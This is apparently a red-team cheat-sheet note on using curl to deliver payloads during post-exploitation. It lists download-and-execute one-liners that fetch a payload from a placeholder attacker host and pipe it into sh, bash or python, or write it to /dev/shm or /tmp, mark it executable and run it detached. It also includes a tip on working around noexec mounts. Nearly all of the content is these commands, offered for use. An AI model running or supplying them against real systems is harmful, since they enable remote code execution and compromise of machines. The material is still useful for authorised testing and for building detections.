# cURL

## 01 - Common Files

```
/usr/bin/curl
```

## 02 - Execute Payloads

### 2.1 - Fileless Code Execution

```
$ curl http[s]://<IP>/payload.sh | sh

$ curl http[s]://<IP>/payload.sh | bash

$ curl http[s]://<IP>/payload.py | python
```

### 2.2 - Dropping On Memory

> [!INFO] Got Permission Denied!
> If you get a `Permission denied` error while executing it in `/dev/shm/`. Check the [[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x00 - Discovery/Desktop/Linux/Host/0xF - Operating System/System/Manual/Living off the Land#^017cc1|mounted drives]] if `noexec` is configured. Otherwise execute it with a [[#01 - Fileless Code Execution|fileless]] method.
> > [!TIP] Compile After Delivery
> > You can automate it with a script to stage the payload execution (refer to the backlinks below).

Download payload and execute it.

```
$ curl -o /dev/shm/payload http[s]://<IP>/payload && chmod +x /dev/shm/payload && /dev/shm/payload & disown
```

### 2.3 - Dropping On Disk

Download payload and execute it.

```
$ curl -o /tmp/payload http[s]://<IP>/payload && chmod +x /tmp/payload && /tmp/payload & disown
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Linux/Code Execution/C/Manual#^e621f6|Compile After Delivery: C Compiler]]

- [[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Linux/Code Execution/CPP/Manual#^e01813|Compile After Delivery: C++ Compiler]]

- [[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Linux/Code Execution/Java/Manual#^ae2cdb|Compile After Delivery: Java Compiler]]

- [[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Cross Platform/Code Execution/Lua/Manual#^e48401|Compile After Delivery: Lua Compiler]]

### GTFOBins

- [GTFOBins: curl](https://gtfobins.github.io/gtfobins/curl/)

### GTFOArgs

- [GTFOArgs: curl](https://gtfoargs.github.io/gtfoargs/curl/)